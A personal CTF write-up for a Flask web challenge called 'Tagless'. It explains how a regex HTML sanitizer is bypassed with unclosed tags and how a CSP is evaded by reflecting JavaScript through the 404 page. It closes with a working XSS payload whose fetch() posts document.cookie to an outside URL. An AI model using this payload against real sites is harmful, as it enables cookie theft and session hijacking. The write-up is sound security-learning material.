Only managed to solve 1 ):
# Tagless
This challenge was a web challenge involving flask. This was my first ctf where challenges needed to be launched and had a time limit, leading to some confusion when accessing the challenge instance. A good learning point from this was to always attempt to reproduce the challenge locally, if possible.
This challenge had 3 important endpoints:
`/`
* The index page, which seems to display whatever message you supply in an iframe
* ![[Pasted image 20240826210809.png]]
`/report`
*  Seems to get the bot to visit a localhost url
```python
@app.route("/report", methods=["POST"])  
def report():  
    bot = Bot()  
    url = request.form.get('url')  
    if url:  
        try:  
            parsed_url = urlparse(url)  
            print("visiting ", parsed_url)  
        except Exception:  
            return {"error": "Invalid URL."}, 400  
        if parsed_url.scheme not in ["http", "https"]:  
            return {"error": "Invalid scheme."}, 400  
        if parsed_url.hostname not in ["127.0.0.1", "localhost"]:  
            return {"error": "Invalid host."}, 401  
        bot.visit(url)  
        bot.close()  
        return {"visited":url}, 200  
    else:  
        return {"error":"URL parameter is missing!"}, 400
```
`/<anything else>`
*  Small yet important, it simply tells you the `url path` you supplied was not found
Next,  we need to find where the flag is stored. Searching around, you find this in `bot.py`
```python
class Bot:  
    def __init__(self):  
		...
    def visit(self, url):  
        self.driver.get("http://127.0.0.1:5000/")  
        self.driver.add_cookie({  
            "name": "flag",   
            "value": "SEKAI{dummy}",   
            "httponly": False    
		})   
		self.driver.get(url)  
        time.sleep(1)  
        self.driver.refresh()
```
This is where the `report` endpoint comes in handy, as it gets the bot to first visit and add a cookie to  itself, then open a corresponding url supplied. If we want any chance of stealing the cookie,  the url we visit must be the same url the cookie was added to (localhost). From there, we need some way to exfiltrate the cookie. 
Looking back at `/`, we  find that the js script linked to the file also takes the query parameter `auto_input` to fill up the iframe. This is valuable as it allows us to inject any html we wish just using the url, e.g. when using `/report`. However, It is also worth noting all input is sanitized by
```js
function sanitizeInput(str) {  
    str = str.replace(/<.*>/igm, '').replace(/<\.*>/igm, '').replace(/<.*>.*<\/.*>/igm, '');   
    return str;  
}
```
, which seems to strip all text that resembles html tags. What if we supplied an incomplete tag, and let the browser close it for us?
![[Pasted image 20240826212534.png]]
Simple, right? Now we can provide a script tag with its src pointing to our payload to extract the cookie. But nope. Unfortunately, all requests are given these pesky CSP headers, preventing both scripts from other urls and inline scripts from running
```python
@app.after_request  
def add_security_headers(resp):  
    resp.headers['Content-Security-Policy'] = "script-src 'self'; style-src 'self' https://fonts.googleapis.com https://unpkg.com 'unsafe-inline'; font-src https://fonts.gstatic.com;"  
    return resp
```
We could have to find a way to get the script to fulfill this csp, which is where
the url not found page comes in handy. Since any unknown path is reflected back in the page content as text, we could use that as the source of the payload, without any CSP violation. 
![[Pasted image 20240826213241.png]]
This is still not valid js, so we need to mangle the url further
![[Pasted image 20240826213351.png]]
### Conclusion
We have this js:
```js
fetch('URL HERE', {body: document.cookie, method: 'POST'});
```
The url payload:
`http://127.0.0.1:5000/?fulldisplay=j&auto_input=http://127.0.0.1:5000/**/JS HERE//;`
We get the final url for `/report`:
`http://127.0.0.1:5000/?fulldisplay=j&auto_input=<script src="http://127.0.0.1:5000/**/fetch('***', {body: document.cookie, method: 'POST', mode:'no-cors'});//"//`
, giving us the flag.
> Notes:
> - I should've used a get request to make my life easier. I have also discovered `Nagivator.sendBeacon()` which seems like a quick and easy way to do requests.
> - Mixing `localhost` and `127.0.0.1` is not ideal, despite them both pointing to the same thing
